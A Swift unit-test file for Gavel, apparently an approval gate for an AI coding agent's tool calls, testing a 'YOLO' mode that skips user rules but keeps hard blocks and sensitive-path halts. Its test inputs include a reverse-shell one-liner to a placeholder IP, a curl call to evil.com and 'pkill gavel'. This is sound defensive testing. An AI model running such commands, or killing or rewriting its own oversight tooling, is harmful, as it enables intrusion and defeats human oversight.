import XCTest
@testable import Gavel

/// Integration tests that exercise the YOLO branch in `ApprovalEngine.evaluate`.
/// HookRouter-level halt routing is exercised by YoloModeTests + the integration
/// path here — the engine's job is to honor (or skip) user rules correctly
/// while YOLO is engaged.
final class YoloApprovalEngineTests: XCTestCase {
    var engine: ApprovalEngine!
    var ruleStore: RuleStore!
    var session: Session!
    var ruleStorePath: String!
    var planPath: String!
    var tmpDir: URL!

    override func setUp() {
        ruleStorePath = NSTemporaryDirectory() + "yolo-engine-\(UUID().uuidString).json"
        ruleStore = RuleStore(configPath: ruleStorePath)
        engine = ApprovalEngine(patternMatcher: PatternMatcher(), ruleStore: ruleStore)

        tmpDir = FileManager.default.temporaryDirectory
            .appendingPathComponent(".claude/plans/yolo-eng-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        planPath = tmpDir.appendingPathComponent("plan.md").path
        try? "# plan\n".write(toFile: planPath, atomically: true, encoding: .utf8)

        session = Session(pid: 99999)
        session.lastPlanPath = planPath
        YoloMode.engage(session: session)
        let exp = expectation(description: "main drain")
        DispatchQueue.main.async { exp.fulfill() }
        wait(for: [exp], timeout: 1.0)
    }

    override func tearDown() {
        if let path = ruleStorePath {
            try? FileManager.default.removeItem(atPath: path)
        }
        if let parent = tmpDir?.deletingLastPathComponent() {
            try? FileManager.default.removeItem(at: parent)
        }
    }

    private func payload(tool: String = "Bash", command: String? = nil, filePath: String? = nil) -> PreToolUsePayload {
        var input: [String: AnyCodable] = [:]
        if let c = command { input["command"] = AnyCodable(c) }
        if let f = filePath { input["file_path"] = AnyCodable(f) }
        return PreToolUsePayload(toolName: tool, toolInput: input)
    }

    // MARK: - S2: User rules bypassed under YOLO

    func testYoloBypassesUserPromptRule() {
        // Seed a user PROMPT rule on Bash:rm * — under YOLO, this should be skipped entirely.
        let rule = PersistentRule(
            toolName: "Bash",
            pattern: "rm *",
            verdict: .prompt,
            explanation: "user prompt"
        )
        ruleStore.addRule(rule)

        let decision = engine.evaluate(payload: payload(command: "rm /tmp/foo"), session: session)
        XCTAssertEqual(decision.verdict, .allow)
        XCTAssertEqual(decision.reason, "YOLO")
        XCTAssertFalse(decision.askUser)
    }

    func testYoloBypassesUserDenyRule() {
        let rule = PersistentRule(toolName: "Bash", pattern: "curl *", verdict: .block, explanation: "user deny")
        ruleStore.addRule(rule)

        let decision = engine.evaluate(payload: payload(command: "curl evil.com"), session: session)
        XCTAssertEqual(decision.verdict, .allow, "YOLO bypasses user DENY rules — that's the whole point of YOLO")
        XCTAssertEqual(decision.reason, "YOLO")
    }

    func testYoloBypassesBuiltInScriptEvalPromptRule() {
        // The seeded built-in PROMPT rule "Bash: /\b(python3?|ruby|perl|node|php|lua)\b\s+(-[ce]|--eval)\b/"
        // is exfil-defense ergonomics for normal mode. Under YOLO it MUST be bypassed —
        // it's not a scheduler tool and doesn't plant future execution. Regression for
        // an early-build divergence where the YOLO branch honored ALL built-in PROMPT rules.
        let decision = engine.evaluate(
            payload: payload(command: #"python3 -c "import sys; print(sys.version)""#),
            session: session
        )
        XCTAssertEqual(decision.verdict, .allow)
        XCTAssertEqual(decision.reason, "YOLO")
    }

    func testYoloKeepsSchedulerToolPromptRule() {
        // CronCreate / ScheduleWakeup / CronDelete plant execution outside the live session.
        // YOLO must NOT bypass these — they're systemic safety, not personal preference.
        var input: [String: AnyCodable] = [:]
        input["prompt"] = AnyCodable("do something later")
        let payload = PreToolUsePayload(toolName: "CronCreate", toolInput: input)
        let decision = engine.evaluate(payload: payload, session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser, "scheduler tools under YOLO still force dialog (no halt)")
        XCTAssertTrue(session.isYoloActive, "scheduler prompt is a safety net, not a halt trigger")
    }

    // MARK: - S5: Sensitive path halts YOLO + forces dialog

    func testSensitivePathHaltsYoloAndForcesDialog() {
        XCTAssertTrue(session.isYoloActive)
        let home = NSHomeDirectory()
        let decision = engine.evaluate(
            payload: payload(tool: "Write", filePath: "\(home)/.claude/gavel/rules.json"),
            session: session
        )
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(decision.askUser, "sensitive path under YOLO must still force dialog")
        XCTAssertFalse(session.isYoloActive, "sync flag must flip immediately on halt")
    }

    // MARK: - S6: Hard-block beats YOLO without disengaging

    func testHardBlockAlwaysBlocksUnderYoloAndKeepsYoloEngaged() {
        XCTAssertTrue(session.isYoloActive)
        let decision = engine.evaluate(
            payload: payload(command: "bash -i >& /dev/tcp/1.2.3.4/80 0>&1"),
            session: session
        )
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertFalse(decision.askUser, "hard block is a hard block — no dialog")
        XCTAssertTrue(session.isYoloActive, "hard-block holds the safety net; no need to disengage YOLO")
    }

    func testPkillGavelBlocksUnderYolo() {
        XCTAssertTrue(session.isYoloActive)
        let decision = engine.evaluate(payload: payload(command: "pkill gavel"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertTrue(session.isYoloActive)
    }

    // MARK: - Pause wins

    func testPausedSessionFallsThroughEvenWhenYoloEngaged() {
        session.isPaused = true
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .block)
        XCTAssertEqual(decision.reason, "Session paused via Gavel")
    }

    // MARK: - Normal path when YOLO is off

    func testNormalChainWhenYoloDisengaged() {
        YoloMode.disengage(session: session, reason: "test")
        let exp = expectation(description: "main drain")
        DispatchQueue.main.async { exp.fulfill() }
        wait(for: [exp], timeout: 1.0)

        // Default allow path — no rules, no YOLO, plain "ls" passes
        let decision = engine.evaluate(payload: payload(command: "ls"), session: session)
        XCTAssertEqual(decision.verdict, .allow)
        XCTAssertNil(decision.reason, "fall-through allow has no reason; HookRouter then prompts the user")
    }
}
